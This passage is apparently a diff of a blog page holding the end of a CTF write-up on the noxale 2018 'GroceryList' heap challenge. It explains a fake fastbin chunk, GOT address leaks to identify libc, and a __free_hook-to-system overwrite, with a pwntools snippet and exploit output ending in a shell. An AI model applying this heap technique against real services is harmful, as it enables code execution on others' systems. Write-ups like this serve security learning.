-<script type="application/javascript" src="https://gist.github.com/segflow/a7142d7e3b866c3577ab8a08ea0c3b9c.js"></script>
-
-
-<pre><code class="language-shell">&gt; $ python exploit.py
-[*] '/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList'
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[+] Starting local process './GroceryList': pid 4407
-[!] ASLR is disabled!
-[4407]
-[*] Heap leak : 0x2aaaab097c48
-[*] PIE Base  : 0x555555554000
-[*] LIBC base : 0x2aaaaacd3000
-[*] items bss : 0x555555756040
-[*] Fake Fast chunk: 0x55555575602d
-[*] puts    : 0x2aaaaad42690
-[*] getchar : 0x2aaaaad49160
-[*] system : 0x2aaaaad18390
-[*] __free_hook : 0x2aaaab0997a8
-[*] Switching to interactive mode
-Which item would you like to remove?
-$ uname -a
-Linux pwnbox 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
-</code></pre>
-	</article>
-</main>
-
-<div id="bottom-nav" class="text-center center-block">
-	<a href=" https://segflow.github.io/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
-</div>
-
-
-  <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "segflow-io" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-  </div>
-  
-  <script>
-    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-    ga('create', 'UA-111743535-1', 'auto');
-    ga('send', 'pageview');
-    window.baseURL = "https:\/\/segflow.github.io\/";
-  </script>
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
-  
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
-  
-  <script src="https://segflow.github.io//js/App.js"></script>
-  
-</body>
-</html>
+</code></pre><p>Now if we allocate 2 new items (small size), the second one will be at our fake chunk. Since our fake chunk is 3 bytes before the global <code>items_list</code> array, by editing it we will place fake addresses in the <code>items_list</code>.</p><p>We will use that to insert fake items address into the <code>items_list</code>, and thus have arbitrary read/write since we can print and edit items.</p><p>We cannot edit a <a href=https://en.wikipedia.org/wiki/Global_Offset_Table>GOT</a> entry since the binary is <code>Full RELRO</code>, so the plan was to overwrite the pointer <code>__free_hook</code> with the address of <code>system</code>, which will make any call to <code>free(SOMETHING)</code> also calls <code>system(SOMETHING)</code>.</p><p>To do this we need to have <code>system</code> and <code>__free_hook</code> addresses. By leaking the addresses of two different <code>libc</code> functions we can know what <code>libc</code> version is being used and thus calculate the addresses of both <code>system</code> and <code>__free_hook</code>, I went for leaking the addresses of <code>puts</code> and <code>getchar</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>overwrite <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;PAD&#34;</span>
+</span></span><span style=display:flex><span>overwrite <span style=color:#f92672>+=</span> p64(pie_base <span style=color:#f92672>+</span> e<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;puts&#39;</span>])    <span style=color:#75715e># items[0]</span>
+</span></span><span style=display:flex><span>overwrite <span style=color:#f92672>+=</span> p64(pie_base <span style=color:#f92672>+</span> e<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;getchar&#39;</span>])  <span style=color:#75715e># items[1]</span>
+</span></span><span style=display:flex><span>edit_item(<span style=color:#ae81ff>8</span>, overwrite)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;0. &#34;</span>)
+</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline(keepends<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>puts <span style=color:#f92672>=</span> u64(leak<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>))
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;1. &#34;</span>)
+</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline(keepends<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>getchar <span style=color:#f92672>=</span> u64(leak<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>))
+</span></span></code></pre></div><p>Running it we get:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; $ python exploit.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    Canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      PIE enabled
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./GroceryList&#39;</span>: pid <span style=color:#ae81ff>4407</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> ASLR is disabled!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4407<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Heap leak : 0x2aaaab097c48
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> PIE Base  : 0x555555554000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> LIBC base : 0x2aaaaacd3000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> items bss : 0x555555756040
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Fake Fast chunk: 0x55555575602d
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> puts    : 0x2aaaaad42690
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> getchar : 0x2aaaaad49160
+</span></span></code></pre></div><p>Using <a href=https://libc.blukat.me/>libc_search</a> we now know that the libc being used is 2.23-ubuntu and that the offsets of <code>system</code> and <code>__free_hook</code> are <code>0x45390</code> and <code>0x3c67a8</code> respectively.</p><p>Now we just need to place <code>__free_hook</code> in <code>items[0]</code> using the same trick as before and edit it to write the address of <code>system</code>.</p><p>The following python code is the final exploit. I&rsquo;m using <a href=https://github.com/Gallopsled/pwntools>Pwntools</a> to do this since it makes network programming much more easy and funny.</p><script src=https://gist.github.com/segflow/a7142d7e3b866c3577ab8a08ea0c3b9c.js></script><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; $ python exploit.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    Canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      PIE enabled
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./GroceryList&#39;</span>: pid <span style=color:#ae81ff>4407</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> ASLR is disabled!
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4407<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Heap leak : 0x2aaaab097c48
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> PIE Base  : 0x555555554000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> LIBC base : 0x2aaaaacd3000
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> items bss : 0x555555756040
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Fake Fast chunk: 0x55555575602d
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> puts    : 0x2aaaaad42690
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> getchar : 0x2aaaaad49160
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> system : 0x2aaaaad18390
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> __free_hook : 0x2aaaab0997a8
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
+</span></span><span style=display:flex><span>Which item would you like to remove?
+</span></span><span style=display:flex><span>$ uname -a
+</span></span><span style=display:flex><span>Linux pwnbox 4.9.87-linuxkit-aufs <span style=color:#75715e>#1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></div></article></main><div id=bottom-nav class="text-center center-block"><a href=https://segflow.github.io/ class="btn btn-default"><i class="fa fa-home"></i> Home</a></div><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//segflow-io.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div></div></div></div></div><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-111743535-1","auto"),ga("send","pageview"),window.baseURL="https://segflow.github.io/"</script><script src=//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js></script><script src=https://segflow.github.io//js/App.js></script></body></html>
